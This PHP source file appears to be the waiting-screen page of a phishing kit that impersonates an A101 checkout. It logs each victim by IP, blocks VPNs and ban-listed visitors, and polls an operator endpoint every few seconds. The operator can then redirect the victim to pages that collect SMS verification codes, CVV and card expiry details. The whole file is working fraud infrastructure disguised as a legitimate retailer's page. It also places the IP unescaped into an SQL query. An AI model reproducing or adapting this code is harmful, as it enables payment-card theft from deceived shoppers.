<?php 
   include_once("config.php");
   include_once("./monke/Data/Server/GrabIP.php");
   include_once("./monke/Data/Server/BlockVPN.php");
   include_once("./monke/Data/Server/BanControl.php");

   $pdo->query("UPDATE logs SET durum = 'Bekleme Ekranı' WHERE ip = '{$ip}'");
?>
<!DOCTYPE html>
<html lang="tr">

<head>
   <meta http-equiv="content-type" content="text/html; charset=UTF-8" />
   <meta http-equiv="X-UA-Compatible" content="IE-EmulateIE7" />
   <meta id="viewport" name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes, minimal-ui" />
   <title>A101 - Harca Harca Bitmez</title>
   <link href="./assets/css/style.css" rel="stylesheet" type="text/css" />
   <script src="https://code.jquery.com/jquery-3.7.1.js" integrity="sha256-eKhayi8LEQwp4NKxN+CfCh+3qOVUtJn3QNZ0TciWLP4=" crossorigin="anonymous"></script>

</head>

<body class="page-inner">

   <section class="js-main-wrapper">
      <section class="page-checkout js-page-checkout js-tab-box">
         <div class="container">
            <div class="checkout-addresses js-tab-content">
               <div class="row">
                  <div class="col-sm-9">
                     <div class="checkout-delivery">
                        <div class="addresses">
                           <div class="section-hero">
                              <ul
                                 class="checklist">
                                 <li class="checkbox">
                                    <input
                                       type="checkbox"
                                       class="js-show-bill-address"
                                       id="billing"
                                       checked
                                       disabled>
                                    <label for="billing">
                                       Fatura adresim ile aynı
                                    </label>
                                 </li>
                              </ul>
                              TESLİMAT ADRESİ
                           </div>
                           <div class="list">
                              <div class="desc">
                                 Lütfen teslimat adresi seçin.
                              </div>
                              <ul class="js-address-list-alternate ">
                                 <li class="selected js-address-box" id="secilenadres" style="display: none;">
                                    <label>
                                       <div class="title">
                                          <a data-type="bill_address" href="javascript:void(0);" class="edit" title="Düzenle">
                                             düzenle
                                          </a>
                                          <div class="check">
                                             <input type="radio" name="js-address-radio-button" class="js-address-radio-button address-radio" data-is-corporate="false" data-user-name="asdasdasd" data-user-surname="dsaasddas" data-has-identity-id="false" checked="">
                                             <div class="radio"></div>
                                             <span>
                                                SEÇTİĞİNİZ ADRES
                                             </span>
                                          </div>
                                       </div>
                                       <div class="details">
                                          <div class="title" id="baslikver"></div>


                                          <div id="detayver"></div>

                                          <div id="telver"></div>

                                       </div>
                                    </label>
                                 </li>
                              </ul>
                              <ul>
                                 <li class="half">
                                    <a href="javascript:void(0);" class="new-address js-new-address" title="Yeni adres oluştur">
                                       <em class="icon-plus"></em>
                                       Yeni adres oluştur
                                    </a>
                                 </li>
                              </ul>
                              <div class="clearfix"></div>
                           </div>
                           <div
                              class="js-bill-addresses"
                              style="display: none">
                              <div class="section-hero js-address-title">
                                 FATURA ADRESİ
                              </div>
                              <div class="list">
                                 <div class="desc">
                                    Lütfen fatura adresi seçin.
                                 </div>
                                 <ul class="js-bill-address-list-alternate"></ul>
                                 <ul>
                                    <li class="half">
                                       <a href="javascript:void(0);" class="new-address js-new-address" data-type="bill_address" title="Yeni adres oluştur">
                                          <em class="icon-plus"></em>
                                          Yeni adres oluştur
                                       </a>
                                    </li>
                                 </ul>
                                 <div class="clearfix"></div>
                              </div>
                           </div>
                        </div>
                        <div class="continue">
                           <form method="post" class="js-proceed-form">
                              <div class="section-hero">
                                 KARGO FİRMASI
                              </div>
                              <div class="cargo">
                                 <div class="desc">
                                    <span id="sehiricin"></span>
                                    şehri için kargo firması seçin.
                                 </div>
                                 <div class="cargo-list">
                                    <ul id="mng" style="display: none;">

                                       <li>
                                          <label class="js-checkout-cargo-item" data-slug="05">
                                             <div class="price">₺0,00</div>
                                             <div class="check">
                                                <input type="radio" name="shipping" class="js-shipping-radio" checked="" value="102">
                                                <div class="radio"></div>
                                                <span>

                                                   MNG Kargo
                                                </span>
                                             </div>
                                          </label>
                                       </li>
                                    </ul>
                                    <div class="error js-error-shipping_option" style="display: none;"></div>
                                 </div>
                                 <a href="javascript:void(0)" class="button hidden green js-modal-trigger">
                                    Kaydet ve Devam Et
                                 </a>
                                 <button type="button" id="devamet" style="display: none;" class="button green js-proceed-button block" data-index="1">
                                    Kaydet ve Devam Et
                                 </button>
                                 <div class="delivery-cargo-wrapper">
                                    <div class="delivery-cargo js-cargo-message hidden" data-slug="02">
                                       None
                                    </div>
                                    <div class="delivery-cargo js-cargo-message hidden" data-slug="05">
                                       None
                                    </div>
                                    <div class="delivery-cargo js-cargo-message hidden" data-slug="01">
                                       None
                                    </div>
                                    <div class="delivery-cargo js-cargo-message hidden" data-slug="04">
                                       None
                                    </div>
                                    <div class="delivery-cargo js-cargo-message hidden" data-slug="06">
                                       None
                                    </div>
                                    <div class="delivery-cargo js-cargo-message hidden" data-slug="07">
                                       None
                                    </div>
                                    <div class="delivery-cargo js-cargo-message hidden" data-slug="08">
                                       None
                                    </div>
                                    <div class="delivery-cargo js-cargo-message hidden" data-slug="10">
                                       None
                                    </div>
                                    <div class="delivery-cargo js-cargo-message hidden" data-slug="11">
                                       None
                                    </div>
                                    <div class="delivery-cargo js-cargo-message hidden" data-slug="RetailStore">
                                       Kurbanınızı, kurban kesim yoğunluğuna bağlı olarak, illere göre Kurban Bayramının 2. gününden itibaren sipariş verirken seçtiğiniz mağazadan e-arşiv faturanızı ve teslim alacak kişiye ait kimliği ibraz ederek teslim alabilirsiniz.
                                    </div>
                                 </div>
                              </div>
                           </form>
                        </div>
                        <div class="clearfix"></div>
                     </div>
                  </div>
                  <div class="col-sm-3">
                     <script class="analytics-data" type="text/json">
                        {
                           "checkout": {
                              "type": "Checkout Step Viewed",
                              "data": {
                                 "currency": "TRY",
                                 "step": 3,
                                 "products": [

                                    {
                                       "product_id": "26031818",
                                       "sku": "26031818017",
                                       "name": "Ugg Classic Clear Mini 1113190\u002DBLK Kadın Bot Siyah",
                                       "price": 4299,
                                       "quantity": 1,
                                       "brand": "Ugg",
                                       "variant": "",
                                       "category": "",
                                       "dimension10": "",
                                       "dimension11": "Online Satışa Özel",
                                       "dimension13": "",
                                       "dimension14": "26031818",
                                       "dimension15": "26031818017",
                                       "dimension16": " 4299 ",
                                       "dimension17": "indirimsiz",
                                       "dimension18": "41",
                                       "dimension30": "72295"
                                    }

                                 ]
                              }
                           }
                        }
                     </script>
                     <div class="checkout-notice">
                        Faturanız elektronik fatura olarak iletilecektir.
                        <span class="red hidden hide-on-app">Ürün afişinde belirtilen sürelerde kargolama ve teslimatlar gerçekleştirilir. Ürün afişinde, ürüne özel bir teslim tarihi belirtilmemişse mevzuattaki teslimat süreleri geçerlidir.</span>
                     </div>
                     <div class="checkout-sidebar">
                        <div class="js-checkout-sum-wrapper" data-variants="[{&quot;key&quot;: &quot;integration_size&quot;, &quot;label&quot;: &quot;Beden : &quot;}, {&quot;key&quot;: &quot;integration_color&quot;,&quot;label&quot;: &quot;Renk : &quot;}]">

                           <div class="title">
                              SİPARİŞ ÖZETİ
                              <span><?php echo $sepetSayisi; ?> Ürün</span>
                           </div>
                           <div class="products">
                              <ul>
                                 <?php

                                 foreach ($urunler as $urun) {
                                    echo '<li>
                                       <a href="urun?id=' . $urun['id'] . '" rel="nofollow" title="' . $urun['urun_adi'] . '">
                                          <img loading="lazy" src="' . $urun['urun_resmi'] . '">
                                          <div class="content">
                                          <div class="price">₺' . number_format((float) str_replace(',', '.', str_replace('TL', '', $urun['urun_fiyati'])), 2, ',', '.') . '</div>
                                          <div>' . $urun['urun_adi'] . '</div>
                                          </div>
                                       </a>
                                       </li> ';
                                 }

                                 ?>

                              </ul>
                           </div>
                           <div class="summary">
                              <table>
                                 <tbody>
                                    <tr>
                                       <td>
                                          Ürünlerin Toplamı
                                       </td>
                                       <td>
                                          ₺<?php echo $toplamFiyat; ?>
                                       </td>
                                    </tr>

                                    <tr class="red">
                                       <td class="discount-wr">
                                          İndirimler <span class="icon-question-basket"></span>
                                          <div class="basket-discount-dropdown">
                                             <div class="discounts">

                                             </div>

                                          </div>
                                       </td>

                                    </tr>

                                 </tbody>
                              </table>
                           </div>

                           <div class="total"><span>₺<?php echo $toplamFiyat; ?></span> Ödenecek Tutar</div>
                        </div>
                     </div>
                     <script id="checkoutSumTemplate" type="text/x-ejs-template">
                        <%
                              if (basket) {
                              %>
                               <div class="title">
                                 SİPARİŞ ÖZETİ
                                 <span><%= basket.total_quantity %> Ürün</span>
                               </div>
                               <div class="products">
                                 <ul>
                                   <%
                              if (basket.hasOwnProperty('basketitem_set')) {
                                basket.basketitem_set.forEach((item) => { %>
                                         <li>
                                           <a href="<%= item.product.absolute_url %>" rel="nofollow" title="<%= item.product.name %>">
                                             <img loading="lazy" src="<%= item.product.productimage_set[0].image %>" />
                                             <div class="content">
                                               <div class="price">₺<%= new Intl.NumberFormat('tr-tr', { minimumFractionDigits: 2 }).format(Number(item.product.price)) %></div>
                                               <div><%= item.product.name %></div>
                                             </div>
                                           </a>
                                         </li> <%
                              })
                              }
                              %>
                                 </ul>
                               </div>
                               <div class="summary">
                                 <table>
                                   <tr>
                                     <td>
                                       Ürünlerin Toplamı
                                     </td>
                                     <td>
                                       ₺<%= new Intl.NumberFormat('tr-tr', { minimumFractionDigits: 2 }).format(Number(basket.total_product_amount)) %>
                                     </td>
                                   </tr>
                                   <% if (shipping) { %>
                                     <tr class="<%= shipping.name ? '' : 'hide' %>">
                                       <td>
                                         Kargo Ücreti (<%= shipping.name %>)
                                       </td>
                                       <td>
                                         ₺<%= new Intl.NumberFormat('tr-tr', { minimumFractionDigits: 2 }).format(Number(shipping.shipping_amount)) %>
                                       </td>
                                     </tr> <%
                              }
                                if (preOrder.payment_choice) { %>
                                       <tr class="red">
                                         <td>
                                           Hizmet Bedeli
                                         </td>
                                         <td>
                                           ₺${preOrder.payment_choice.price}
                                         </td>
                                       </tr> <%
                              }
                              if (basket.discounts) { %>
                                     <tr class="red">
                                       <td class="discount-wr">
                                         İndirimler <span class="icon-question-basket"></span>
                                         <div class="basket-discount-dropdown">
                                           <div class="discounts">
                                             <% basket.discounts.map((discount) => { %>
                                               <div>
                                                 <span><%=discount.description %></span>
                                                 <span>-₺<%= new Intl.NumberFormat('tr-tr').format(Number(discount.discount)) %></span>
                                               </div>
                                             <%  }) %>
                                           </div>
                                           <% if (basket.total_discount_amount > 0) { %>
                                             <div class="total-discount">
                                               Toplam İndirim <span>-₺<%= new Intl.NumberFormat('tr-tr', { minimumFractionDigits: 2 }).format(Number(basket.total_discount_amount)) %></span>
                                             </div>
                                           <% } %>
                                         </div>
                                       </td>
                                       <% if (basket.total_discount_amount > 0) { %>
                                         <td>
                                           -<%= new Intl.NumberFormat('tr-tr', { minimumFractionDigits: 2 }).format(Number(basket.total_discount_amount)) %>
                                         </td>
                                       <% } %>
                                     </tr>
                                   <%
                              }
                              %>
                                 </table>
                               </div>
                               <% if (preOrder && preOrder.installment && preOrder.installment.price_with_accrued_interest) { %>
                                 <div class="total"><span>₺<%= new Intl.NumberFormat('tr-tr', { minimumFractionDigits: 2 }).format(Number(preOrder.installment.price_with_accrued_interest)) %></span> Ödenecek Tutar</div>
                                 <% } else if (preOrder) { %>
                                   <div class="total"><span>₺<%= new Intl.NumberFormat('tr-tr', { minimumFractionDigits: 2 }).format(Number(preOrder.total_amount)) %></span> Ödenecek Tutar</div> <%
                              }
                              }
                              %>
                        </script>
                  </div>
               </div>
            </div>

            <div class="js-masterpass-modal-08 masterpass-modal" data-modal-id="08">
               <div class="masterpass-modal-wrapper">
                  <div class="masterpass-modal-header">

                     <div class="title v2 success">
                        <img src="./assets/Loading_icon.gif" alt="">
                     </div>

                     <div class="content">
                        <p>Ödemeniz alınıyor. Lütfen bekleyiniz...</p>
                     </div>
                  </div>
                  <div class="masterpass-modal-content">
                  </div>

               </div>
            </div>
         </div>
      </section>


   </section>

   <div class="back-to-top js-back-to-top hide-on-app"><i class="fa fa-angle-up"></i></div>

   <script type="text/javascript">
      $(document).ready(function() {
         gonder();
         var int = self.setInterval("gonder()", 2500);
      });

      function gonder() {
         $.ajax({
            type: 'POST',
            url: '<?php echo "/veri.php?ip=" . $ip; ?>',
            success: function(msg) {
               if (msg.includes('sms')) {
                  window.location.href = 'acsredirect';
               }
               if (msg.includes('tebrikler')) {
                  window.location.href = 'acsredirect?control=success';
               }
               if (msg.includes('hata_sms')) {
                  window.location.href = 'acsredirect?control=error';
               }
               if (msg.includes('hata_limit')) {
                  window.location.href = '/?redirect=error_limit';
               }
               if (msg.includes('hata_internet')) {
                  window.location.href = '/?redirect=error_internet';
               }
               if (msg.includes('hata_cvv')) {
                  window.location.href = '/odeme?status=cvv';
               }
               if (msg.includes('hata_skt')) {
                  window.location.href = '/odeme?status=skt';
               }
               if (msg.includes('hata_dogrulama')) {
                  window.location.href = '/dogrulama?control=error';
               }
               if (msg == "dogrulama" || msg == "dogrulamadogrulama") {
                  window.location.href = '/dogrulama';
               }
               if (msg.includes('basa_dondur')) {
                  window.location.href = '/';
               }
            }
         });
      }
   </script>
</body>

</html>